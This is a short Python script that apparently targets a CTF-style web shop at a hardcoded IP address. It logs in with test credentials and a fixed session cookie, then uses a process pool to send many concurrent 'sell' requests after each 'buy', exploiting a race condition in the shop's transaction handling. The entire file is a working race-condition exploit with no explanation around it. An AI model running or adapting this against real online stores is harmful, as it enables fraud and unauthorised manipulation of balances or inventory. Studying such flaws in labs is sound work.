import requests as rq
from multiprocessing import Pool

headers = {
        "Content-Type": "application/x-www-form-Urlencoded"
    }
cookies = {
    "PHPSESSID":"57e5bcc179dff2824c533ace62c94d1a"
}

def login(username, password):
    url = "http://207.148.70.254:7003/index.php?page=login"

    payload = f"username={username}&password={password}"

    response = rq.post(url=url, headers=headers, data=payload, cookies=cookies,allow_redirects=False)
    print(response.status_code)


def buy(item_id):
    url = "http://207.148.70.254:7003/index.php?page=shop"
    payload = f"item_id={item_id}"
    response = rq.post(url=url, headers=headers,cookies=cookies, data=payload)
    print(f"buy item {item_id}")


def sell(item_id):
    url = "http://207.148.70.254:7003/index.php?page=cart"
    payload = f"item_id={item_id}"
    response = rq.post(url=url, headers=headers, data=payload, cookies=cookies)
    print(f"sell item {item_id}")


def buy_and_sell(id):
    sell(1)
    sell(1)
    sell(1)
    print(id)


def check_acid():
    with Pool(4) as p:
        for i in range(1, 20):
            buy(1)
            p.map(buy_and_sell, range(10))


if __name__ == '__main__':
    username = "bien2"
    password = "bien"
    login(username=username, password=password)
    check_acid()
